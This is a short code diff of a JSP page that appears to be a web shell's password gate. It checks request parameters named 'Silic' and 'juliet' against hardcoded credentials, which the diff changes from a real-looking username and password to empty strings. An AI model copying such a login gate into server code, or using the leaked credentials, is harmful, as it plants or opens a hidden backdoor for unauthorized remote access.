@@ -692,8 +692,8 @@ String htmlEntity(String htmlCode){
     final String WEB_SITE=folderReplace(application.getRealPath("/"));
     final String URL=request.getRequestURI();
     if(session.getAttribute("ID")==null){
-        String username="finss";
-        String password="finss12!@";
+        String username="";
+        String password="";
   if(request.getParameter("Silic")!=null&&request.getParameter("juliet")!=null&&request.getParameter("Silic").equals(username)&&request.getParameter("juliet").equals(password)){
             session.setAttribute("ID","1");
             response.sendRedirect(URL);
